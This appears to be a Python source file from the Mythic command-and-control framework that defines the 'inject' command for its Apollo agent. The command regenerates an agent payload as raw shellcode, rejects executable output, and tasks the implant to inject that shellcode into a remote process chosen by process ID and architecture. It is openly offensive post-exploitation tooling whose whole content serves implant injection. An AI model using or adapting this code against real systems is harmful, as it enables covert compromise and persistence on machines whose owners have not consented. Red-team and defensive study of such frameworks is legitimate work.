from mythic_payloadtype_container.MythicCommandBase import *
import json
from mythic_payloadtype_container.MythicRPC import *
import base64

class InjectArguments(TaskArguments):

    def __init__(self, command_line):
        super().__init__(command_line)
        self.args = {
            "template": CommandParameter(name="Payload Template", type=ParameterType.Payload, supported_agents=["Apollo"], supported_agent_build_parameters={"Apollo": {"output_type": "Shellcode"}}),
            "pid": CommandParameter(name="PID", type=ParameterType.Number),
            "arch": CommandParameter(name="Architecture", type=ParameterType.ChooseOne, choices=["x64", "x86"])
        }

    errorMsg = "Missing required parameter: {}"

    async def parse_arguments(self):
        if (self.command_line[0] != "{"):
            raise Exception("Inject requires JSON parameters and not raw command line.")
        self.load_args_from_json_string(self.command_line)


class InjectCommand(CommandBase):
    cmd = "inject"
    needs_admin = False
    help_cmd = "inject (modal popup)"
    description = "Inject agent shellcode into a remote process."
    version = 2
    is_exit = False
    is_file_browse = False
    is_process_list = False
    is_download_file = False
    is_upload_file = False
    is_remove_file = False
    author = "@djhohnstein"
    argument_class = InjectArguments
    attackmapping = []

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        temp = await MythicRPC().execute("get_payload",
                                         payload_uuid=task.args.get_arg("template"))
        gen_resp = await MythicRPC().execute("create_payload_from_uuid",
                                             task_id=task.id,
                                             payload_uuid=task.args.get_arg('template'),
                                             new_description="{}'s injection into PID {}".format(task.operator, str(task.args.get_arg("pid"))))
        if gen_resp.status == MythicStatus.Success:
            # we know a payload is building, now we want it
            while True:
                resp = await MythicRPC().execute("get_payload", 
                                                 payload_uuid=gen_resp.response["uuid"],
                                                 get_contents=True)
                if resp.status == MythicStatus.Success:
                    if resp.response["build_phase"] == 'success':
                        b64contents = resp.response["contents"]
                        pe = base64.b64decode(b64contents)
                        if len(pe) > 1 and pe[:2] == b"\x4d\x5a":
                            raise Exception("Inject requires a payload of Raw output, but got an executable.")
                        # it's done, so we can register a file for it
                        task.args.add_arg("template", resp.response["file"]['agent_file_id'])
                        task.display_params = "payload '{}' into PID {} ({})".format(temp.response["tag"], task.args.get_arg("pid"), task.args.get_arg("arch"))
                        break
                    elif resp.response["build_phase"] == 'error':
                        raise Exception("Failed to build new payload: " + resp.response["error_message"])
                    else:
                        await asyncio.sleep(1)
        else:
            raise Exception("Failed to build payload from template {}".format(task.args.get_arg("template")))
        return task

    async def process_response(self, response: AgentResponse):
        pass
